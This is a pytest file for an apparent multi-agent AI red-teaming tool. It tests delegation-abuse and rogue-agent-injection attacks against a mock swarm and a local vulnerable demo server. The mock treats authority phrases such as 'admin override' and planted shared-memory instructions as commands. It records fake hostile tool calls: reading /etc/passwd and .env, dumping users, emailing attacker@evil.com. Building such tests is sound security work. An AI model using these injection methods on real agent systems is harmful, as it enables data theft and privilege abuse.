"""Tests for Phase 4D: delegation abuse + rogue agent injection.

Covers:
- Payload loading for delegation and rogue categories
- Delegation abuse unit tests (mock adapter)
- Rogue agent injection unit tests (mock adapter)
- Integration tests against the real demo server
"""

from __future__ import annotations

import threading
import time
from collections.abc import Generator
from pathlib import Path
from typing import Any

import pytest

from puppetstring.adapters.swarm_adapter import SwarmAdapter
from puppetstring.config import CutConfig
from puppetstring.core.models import ToolCall
from puppetstring.modules.agent_swarm.models import (
    AgentInfo,
    SwarmAttackType,
    SwarmClassification,
    SwarmObservation,
    SwarmResult,
)
from puppetstring.modules.agent_swarm.module import CutEngine
from puppetstring.modules.agent_swarm.payload_loader import (
    load_builtin_swarm_payloads,
    load_swarm_payload_file,
    resolve_agent_placeholders,
)

# ── Helpers ──────────────────────────────────────────────────────

PAYLOADS_DIR = (
    Path(__file__).resolve().parent.parent / "puppetstring" / "modules" / "agent_swarm" / "payloads"
)

TWO_AGENTS = [
    AgentInfo(
        agent_id="researcher",
        name="Research Agent",
        role="researcher",
        privilege_level="low",
        tools=["search", "read_file"],
    ),
    AgentInfo(
        agent_id="executor",
        name="Execution Agent",
        role="executor",
        privilege_level="high",
        tools=["run_command", "write_file", "send_email", "query_db"],
    ),
]


# ── Mock adapter ─────────────────────────────────────────────────


class MockSwarmAdapter(SwarmAdapter):
    """Fake swarm that simulates delegation and injection vulnerabilities."""

    def __init__(self, target: str = "mock://swarm", **kwargs: Any) -> None:
        super().__init__(target, **kwargs)
        self._agents = list(TWO_AGENTS)
        self._shared_memory: dict[str, dict[str, str]] = {"default": {}}
        self._injected: list[str] = []
        self._resets = 0

    async def connect(self) -> None:
        self._connected = True

    async def disconnect(self) -> None:
        self._connected = False

    async def list_agents(self) -> list[AgentInfo]:
        return list(self._agents)

    async def get_agent_info(self, agent_id: str) -> AgentInfo:
        for a in self._agents:
            if a.agent_id == agent_id:
                return a
        msg = f"Unknown agent: {agent_id}"
        raise ValueError(msg)

    async def send_message_as(
        self,
        sender_id: str,
        recipient_id: str,
        message: str,
    ) -> SwarmObservation:
        """Simulate vulnerable agent that trusts messages and memory."""
        lower = message.lower()
        tool_calls: list[ToolCall] = []

        # Check shared memory for instructions
        for key, value in self._shared_memory.get("default", {}).items():
            if "instruction" in key.lower() or "command" in key.lower():
                value_lower = str(value).lower()
                if "run_command" in value_lower or "execute" in value_lower:
                    cmd = str(value).split(":", 1)[-1].strip()
                    tool_calls.append(ToolCall(name="run_command", arguments={"command": cmd}))
                elif "email" in value_lower:
                    tool_calls.append(
                        ToolCall(name="send_email", arguments={"to": "evil@test.com"})
                    )
                elif "write" in value_lower:
                    tool_calls.append(
                        ToolCall(name="write_file", arguments={"path": "/tmp/out"})  # noqa: S108
                    )

        # Trust authority claims
        authority_phrases = [
            "system administrator",
            "admin override",
            "emergency protocol",
            "orchestrator directive",
        ]
        if any(phrase in lower for phrase in authority_phrases):
            if "run" in lower or "execute" in lower or "command" in lower:
                tool_calls.append(
                    ToolCall(name="run_command", arguments={"command": "cat /etc/passwd"})
                )
            if "email" in lower or "send" in lower:
                tool_calls.append(
                    ToolCall(name="send_email", arguments={"to": "attacker@evil.com"})
                )

        action = "Complied with request" if tool_calls else f"Received from {sender_id}"
        return SwarmObservation(
            affected_agent=recipient_id,
            action_taken=action,
            tool_calls=tool_calls,
        )

    async def read_shared_memory(self, namespace: str = "default") -> dict[str, Any]:
        return dict(self._shared_memory.get(namespace, {}))

    async def write_shared_memory(self, key: str, value: str, namespace: str = "default") -> bool:
        self._shared_memory.setdefault(namespace, {})[key] = value
        return True

    async def get_delegation_chain(self, task_id: str = "") -> list[dict[str, Any]]:
        return []

    async def delegate_task(
        self,
        from_agent: str,
        to_agent: str,
        task: str,
    ) -> SwarmObservation:
        """Simulate delegation — executor processes the task as a message."""
        lower = task.lower()
        tool_calls: list[ToolCall] = []

        if "run" in lower or "command" in lower or "execute" in lower:
            tool_calls.append(ToolCall(name="run_command", arguments={"command": task[:100]}))
        if "email" in lower or "send" in lower:
            tool_calls.append(ToolCall(name="send_email", arguments={"to": "attacker@evil.com"}))
        if "read" in lower and "file" in lower:
            tool_calls.append(ToolCall(name="read_file", arguments={"path": ".env"}))
        if "write" in lower and "file" in lower:
            tool_calls.append(
                ToolCall(name="write_file", arguments={"path": "/tmp/out"})  # noqa: S108
            )
        if "query" in lower or "database" in lower or "sql" in lower:
            tool_calls.append(ToolCall(name="query_db", arguments={"sql": "SELECT * FROM users"}))
        if "share" in lower or "store" in lower:
            pass  # memory changes only

        action = "Delegated task executed" if tool_calls else f"Delegation from {from_agent}"
        return SwarmObservation(
            affected_agent=to_agent,
            action_taken=action,
            tool_calls=tool_calls,
            delegation_path=[from_agent, to_agent],
        )

    async def inject_agent(self, agent_config: dict[str, Any]) -> str:
        agent_id = agent_config.get("agent_id", f"rogue_{len(self._injected)}")
        self._agents.append(
            AgentInfo(
                agent_id=agent_id,
                name=agent_config.get("name", "Rogue"),
                role=agent_config.get("role", "rogue"),
                tools=agent_config.get("tools", []),
                privilege_level=agent_config.get("privilege_level", "low"),
            )
        )
        self._injected.append(agent_id)
        return agent_id

    async def remove_agent(self, agent_id: str) -> bool:
        self._agents = [a for a in self._agents if a.agent_id != agent_id]
        return True

    async def reset_swarm(self) -> None:
        self._shared_memory = {"default": {}}
        self._agents = list(TWO_AGENTS)
        self._injected.clear()
        self._resets += 1


# ═══════════════════════════════════════════════════════════════════
# UNIT TESTS — Payload Loading
# ═══════════════════════════════════════════════════════════════════


class TestDelegationPayloadLoader:
    """Test YAML loading for delegation payloads."""

    def test_load_delegation_payloads(self) -> None:
        payloads = load_swarm_payload_file(PAYLOADS_DIR / "delegation_abuse.yaml")
        assert len(payloads) == 8
        assert all(p.attack_type == SwarmAttackType.DELEGATION for p in payloads)
        assert all(p.category == "delegation" for p in payloads)

    def test_delegation_payloads_have_delegate_task(self) -> None:
        payloads = load_swarm_payload_file(PAYLOADS_DIR / "delegation_abuse.yaml")
        for p in payloads:
            assert p.delegate_task, f"Payload {p.name} missing delegate_task"

    def test_load_builtin_delegation(self) -> None:
        payloads = load_builtin_swarm_payloads(["delegation"])
        assert len(payloads) == 8

    def test_resolve_delegation_placeholders(self) -> None:
        payloads = load_builtin_swarm_payloads(["delegation"])
        resolved = resolve_agent_placeholders(payloads, TWO_AGENTS)
        for p in resolved:
            assert "{low_priv}" not in p.sender_agent
            assert "{high_priv}" not in p.target_agent
            assert p.sender_agent == "researcher"
            assert p.target_agent == "executor"


class TestRoguePayloadLoader:
    """Test YAML loading for rogue agent payloads."""

    def test_load_rogue_payloads(self) -> None:
        payloads = load_swarm_payload_file(PAYLOADS_DIR / "rogue_agent.yaml")
        assert len(payloads) == 8
        assert all(p.attack_type == SwarmAttackType.ROGUE for p in payloads)
        assert all(p.category == "rogue" for p in payloads)

    def test_rogue_payloads_have_agent_config(self) -> None:
        payloads = load_swarm_payload_file(PAYLOADS_DIR / "rogue_agent.yaml")
        for p in payloads:
            assert p.agent_config, f"Payload {p.name} missing agent_config"
            assert "agent_id" in p.agent_config

    def test_load_builtin_rogue(self) -> None:
        payloads = load_builtin_swarm_payloads(["rogue"])
        assert len(payloads) == 8

    def test_load_all_categories(self) -> None:
        payloads = load_builtin_swarm_payloads()
        assert len(payloads) == 32  # 8 trust + 8 memory + 8 delegation + 8 rogue


# ═══════════════════════════════════════════════════════════════════
# UNIT TESTS — Delegation Abuse
# ═══════════════════════════════════════════════════════════════════


class TestDelegationAbuseUnit:
    """Unit tests for _run_delegation_abuse with mock adapter."""

    async def test_delegation_produces_results(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=3,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_delegation_abuse(TWO_AGENTS)
            assert len(results) == 3
            assert all(isinstance(r, SwarmResult) for r in results)

    async def test_delegation_has_exploited(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=8,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_delegation_abuse(TWO_AGENTS)
            classifications = {r.classification for r in results}
            assert SwarmClassification.EXPLOITED in classifications

    async def test_delegation_metadata(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=1,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_delegation_abuse(TWO_AGENTS)
            result = results[0]
            assert result.payload_category == "delegation"
            assert result.attack_type == SwarmAttackType.DELEGATION
            assert result.sender_agent == "researcher"
            assert result.target_agent == "executor"

    async def test_delegation_has_delegation_path(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=1,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_delegation_abuse(TWO_AGENTS)
            obs = results[0].observation
            assert obs.delegation_path == ["researcher", "executor"]

    async def test_delegation_reset_between(self) -> None:
        adapter = MockSwarmAdapter()
        await adapter.connect()
        config = CutConfig(
            max_attacks=3,
            delay_between_attacks=0.0,
            reset_between_attacks=True,
        )
        engine = CutEngine(adapter=adapter, config=config)
        await engine._run_delegation_abuse(TWO_AGENTS)
        assert adapter._resets >= 3
        await adapter.disconnect()


# ═══════════════════════════════════════════════════════════════════
# UNIT TESTS — Rogue Agent Injection
# ═══════════════════════════════════════════════════════════════════


class TestRogueAgentUnit:
    """Unit tests for _run_rogue_agent with mock adapter."""

    async def test_rogue_produces_results(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=3,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_rogue_agent(TWO_AGENTS)
            assert len(results) == 3
            assert all(isinstance(r, SwarmResult) for r in results)

    async def test_rogue_has_exploited(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=8,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_rogue_agent(TWO_AGENTS)
            classifications = {r.classification for r in results}
            assert SwarmClassification.EXPLOITED in classifications

    async def test_rogue_metadata(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=1,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_rogue_agent(TWO_AGENTS)
            result = results[0]
            assert result.payload_category == "rogue"
            assert result.attack_type == SwarmAttackType.ROGUE

    async def test_rogue_cleans_up_injected_agent(self) -> None:
        adapter = MockSwarmAdapter()
        await adapter.connect()
        config = CutConfig(
            max_attacks=1,
            delay_between_attacks=0.0,
            reset_between_attacks=False,
        )
        engine = CutEngine(adapter=adapter, config=config)
        await engine._run_rogue_agent(TWO_AGENTS)
        # Rogue should have been removed after the attack
        agent_ids = {a.agent_id for a in adapter._agents}
        assert "rogue_admin" not in agent_ids
        await adapter.disconnect()

    async def test_rogue_with_memory_poison(self) -> None:
        """Rogue payloads with shared_memory_key should write memory."""
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=8,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_rogue_agent(TWO_AGENTS)
            # We just verify that all results completed without error
            error_results = [r for r in results if r.classification == SwarmClassification.ERROR]
            assert len(error_results) == 0

    async def test_rogue_with_delegation(self) -> None:
        """Rogue payloads with delegate_task should use delegation."""
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=8,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_rogue_agent(TWO_AGENTS)
            # inject_and_delegate payload (index 4) uses delegation
            delegation_results = [r for r in results if r.observation.delegation_path]
            assert len(delegation_results) > 0


class TestCutEngineFullRunWithAll:
    """Test full engine run includes all four categories."""

    async def test_run_all_four_categories(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=2,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            result = await engine.run(attack_type="all")
            assert result.error is None
            categories = {r.payload_category for r in result.results}
            assert categories == {"trust", "memory", "delegation", "rogue"}

    async def test_run_delegation_standalone(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=3,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            result = await engine.run(attack_type="delegation")
            assert result.error is None
            assert len(result.results) == 3

    async def test_run_rogue_standalone(self) -> None:
        async with MockSwarmAdapter() as adapter:
            config = CutConfig(
                max_attacks=3,
                delay_between_attacks=0.0,
                reset_between_attacks=False,
            )
            engine = CutEngine(adapter=adapter, config=config)
            result = await engine.run(attack_type="rogue")
            assert result.error is None
            assert len(result.results) == 3


# ═══════════════════════════════════════════════════════════════════
# INTEGRATION TESTS (real server on port 18003)
# ═══════════════════════════════════════════════════════════════════

INTEGRATION_HOST = "127.0.0.1"
INTEGRATION_PORT = 18003


@pytest.fixture(scope="module")
def swarm_server() -> Generator[None, None, None]:
    """Start the vulnerable swarm server in a background daemon thread."""
    from examples.multi_agent_demo.server import create_server

    srv = create_server(INTEGRATION_HOST, INTEGRATION_PORT)
    thread = threading.Thread(target=srv.serve_forever, daemon=True)
    thread.start()
    time.sleep(0.3)
    yield
    srv.shutdown()


@pytest.fixture
def _reset_swarm() -> Generator[None, None, None]:
    """Reset swarm state between integration tests."""
    from examples.multi_agent_demo.server import reset_swarm

    reset_swarm()
    yield


class TestDelegationIntegration:
    """Integration tests: delegation abuse against the real demo server."""

    @pytest.mark.usefixtures("swarm_server", "_reset_swarm")
    async def test_delegation_triggers_tool_calls(self) -> None:
        from puppetstring.adapters.http_swarm_adapter import HTTPSwarmAdapter

        async with HTTPSwarmAdapter(f"http://{INTEGRATION_HOST}:{INTEGRATION_PORT}") as adapter:
            config = CutConfig(
                max_attacks=8,
                delay_between_attacks=0.0,
                reset_between_attacks=True,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_delegation_abuse(await adapter.list_agents())
            tool_call_results = [r for r in results if r.observation.tool_calls]
            assert len(tool_call_results) > 0, "No delegation payloads triggered tool calls"

    @pytest.mark.usefixtures("swarm_server", "_reset_swarm")
    async def test_delegation_at_least_one_exploited(self) -> None:
        from puppetstring.adapters.http_swarm_adapter import HTTPSwarmAdapter

        async with HTTPSwarmAdapter(f"http://{INTEGRATION_HOST}:{INTEGRATION_PORT}") as adapter:
            config = CutConfig(
                max_attacks=8,
                delay_between_attacks=0.0,
                reset_between_attacks=True,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_delegation_abuse(await adapter.list_agents())
            classifications = {r.classification for r in results}
            assert SwarmClassification.EXPLOITED in classifications

    @pytest.mark.usefixtures("swarm_server", "_reset_swarm")
    async def test_delegation_results_metadata(self) -> None:
        from puppetstring.adapters.http_swarm_adapter import HTTPSwarmAdapter

        async with HTTPSwarmAdapter(f"http://{INTEGRATION_HOST}:{INTEGRATION_PORT}") as adapter:
            config = CutConfig(
                max_attacks=2,
                delay_between_attacks=0.0,
                reset_between_attacks=True,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_delegation_abuse(await adapter.list_agents())
            for r in results:
                assert r.payload_category == "delegation"
                assert r.attack_type == SwarmAttackType.DELEGATION
                assert r.intent


class TestRogueIntegration:
    """Integration tests: rogue agent injection against the real demo server."""

    @pytest.mark.usefixtures("swarm_server", "_reset_swarm")
    async def test_rogue_injection_accepted(self) -> None:
        """Server should accept rogue agent injection (no auth)."""
        from puppetstring.adapters.http_swarm_adapter import HTTPSwarmAdapter

        async with HTTPSwarmAdapter(f"http://{INTEGRATION_HOST}:{INTEGRATION_PORT}") as adapter:
            agent_id = await adapter.inject_agent(
                {
                    "agent_id": "test_rogue",
                    "name": "Test Rogue",
                    "role": "rogue",
                    "tools": ["run_command"],
                    "privilege_level": "admin",
                }
            )
            assert agent_id == "test_rogue"
            agents = await adapter.list_agents()
            ids = {a.agent_id for a in agents}
            assert "test_rogue" in ids
            # Clean up
            await adapter.remove_agent("test_rogue")

    @pytest.mark.usefixtures("swarm_server", "_reset_swarm")
    async def test_rogue_attack_produces_results(self) -> None:
        from puppetstring.adapters.http_swarm_adapter import HTTPSwarmAdapter

        async with HTTPSwarmAdapter(f"http://{INTEGRATION_HOST}:{INTEGRATION_PORT}") as adapter:
            config = CutConfig(
                max_attacks=4,
                delay_between_attacks=0.0,
                reset_between_attacks=True,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_rogue_agent(await adapter.list_agents())
            assert len(results) == 4
            assert all(r.payload_category == "rogue" for r in results)

    @pytest.mark.usefixtures("swarm_server", "_reset_swarm")
    async def test_rogue_at_least_one_exploited(self) -> None:
        from puppetstring.adapters.http_swarm_adapter import HTTPSwarmAdapter

        async with HTTPSwarmAdapter(f"http://{INTEGRATION_HOST}:{INTEGRATION_PORT}") as adapter:
            config = CutConfig(
                max_attacks=8,
                delay_between_attacks=0.0,
                reset_between_attacks=True,
            )
            engine = CutEngine(adapter=adapter, config=config)
            results = await engine._run_rogue_agent(await adapter.list_agents())
            classifications = {r.classification for r in results}
            assert SwarmClassification.EXPLOITED in classifications
